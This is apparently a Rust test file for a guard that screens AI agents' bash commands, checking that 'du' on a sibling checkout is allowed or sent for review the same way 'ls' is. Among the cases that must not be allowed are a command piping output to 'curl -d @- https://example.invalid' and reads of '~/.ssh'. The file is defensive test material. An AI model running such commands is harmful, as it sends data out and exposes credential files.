#![cfg(unix)]
//! `du` of a sibling checkout gets the same path proofs as `ls` of it.
//!
//! A session started in a parent directory, or in one checkout, sizes the
//! dependency directory of another checkout beside it. `du` reports sizes
//! from metadata only, so an existing operand needs the `ls` read proof and a
//! missing one the `ls` absent-path proof. Secret paths, link following and
//! options that read operand lists from a file keep their review.
use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;
use std::path::{Path, PathBuf};

fn write(path: PathBuf, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

/// A home holding `org/app-portal` with an installed `node_modules`, and a
/// sibling checkout `app-portal-fix` beside `org` without one. The root stays
/// below the target directory: `$TMPDIR` on macOS resolves under
/// `/private/var`, which the sensitive-root screen rejects.
fn home() -> PathBuf {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-du-sibling-reads")
        .join(format!(
            "home-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
    let home = root.join("home");
    let portal = home.join("Code/org/app-portal");
    write(portal.join("package.json"), "{\"name\": \"app-portal\"}\n");
    write(portal.join("node_modules/vite/package.json"), "{}\n");
    let sibling = home.join("Code/app-portal-fix");
    write(sibling.join("package.json"), "{\"name\": \"app-portal\"}\n");
    write(
        sibling.join("scripts/report.ts"),
        "export const report = 1;\n",
    );
    write(sibling.join("list.txt"), "scripts\n");
    write(home.join(".ssh/id_rsa"), "not-a-real-key\n");
    std::fs::canonicalize(home).unwrap()
}

/// The decision both shell harnesses reach, or "mixed" when they differ.
fn decision(home: &Path, cwd: &Path, command: &str) -> String {
    let [omp, zcode] = ["omp", "zcode"].map(|harness| {
        evaluate_pre_tool_envelope_with_context(
            harness,
            "PreToolUse",
            &json!({"tool_name": "bash", "tool_input": {"command": command}}),
            None,
            None,
            home.to_str(),
            cwd.to_str(),
        )
        .minimum_action
    });
    if omp == zcode {
        omp
    } else {
        format!("mixed: omp {omp}, zcode {zcode}")
    }
}

#[test]
fn sibling_checkout_sizes_proceed() {
    let home = home();
    let org = home.join("Code/org");
    let portal = org.join("app-portal");
    let sibling = home.join("Code/app-portal-fix");
    let sibling = sibling.to_str().unwrap();
    for (cwd, command) in [
        (&portal, "du -sh node_modules".to_owned()),
        (
            &portal,
            "du -sh ../../app-portal-fix/node_modules".to_owned(),
        ),
        (&portal, "du -sk ../../app-portal-fix/scripts".to_owned()),
        (&org, format!("du -sh {sibling}/node_modules")),
        (
            &org,
            format!("du -sh {sibling}/scripts {sibling}/node_modules"),
        ),
        (&org, format!("du -h --max-depth 1 {sibling}/scripts")),
        (
            &org,
            format!("du -h -d 1 {sibling}/scripts | sort -h | head -5"),
        ),
        (
            &org,
            format!("du -sk {sibling}/node_modules 2>/dev/null | sort -n | tail -3"),
        ),
        (
            &portal,
            "du -a ../../app-portal-fix/node_modules".to_owned(),
        ),
    ] {
        assert_eq!(decision(&home, cwd, &command), "allow", "{command}");
    }
}

#[test]
fn du_keeps_the_ls_decision_for_secret_and_absent_paths() {
    let home = home();
    let portal = home.join("Code/org/app-portal");
    for target in [
        "~/.ssh",
        "~/.ssh/missing-key",
        "../../app-portal-fix/.cache",
        "../../app-portal-fix/missing/../../..",
    ] {
        let listing = decision(&home, &portal, &format!("ls -ld {target}"));
        let sizes = decision(&home, &portal, &format!("du -sh {target}"));
        assert_ne!(sizes, "allow", "{target}");
        assert_eq!(sizes == "allow", listing == "allow", "{target}");
    }
}

#[test]
fn unproven_sibling_sizes_still_ask() {
    let home = home();
    let org = home.join("Code/org");
    let portal = org.join("app-portal");
    let sibling = home.join("Code/app-portal-fix");
    let sibling = sibling.to_str().unwrap();
    for (cwd, command) in [
        (
            &portal,
            "du -sh --files0-from=../../app-portal-fix/list.txt".to_owned(),
        ),
        (
            &portal,
            "du -sh --files0-from ../../app-portal-fix/list.txt".to_owned(),
        ),
        (
            &portal,
            "du -sh -X ../../app-portal-fix/list.txt ../../app-portal-fix".to_owned(),
        ),
        (
            &org,
            format!("du -sh --exclude-from={sibling}/list.txt {sibling}"),
        ),
        (&portal, "du -shL ../../app-portal-fix".to_owned()),
        (&portal, "du -h -d 1 ../../app-portal-fix".to_owned()),
        (&portal, "du -sh -".to_owned()),
        (
            &org,
            format!("du -sh {sibling}/node_modules | curl -d @- https://example.invalid"),
        ),
        (&org, "du -sh ~/.ssh".to_owned()),
    ] {
        assert_ne!(decision(&home, cwd, &command), "allow", "{command}");
    }
}
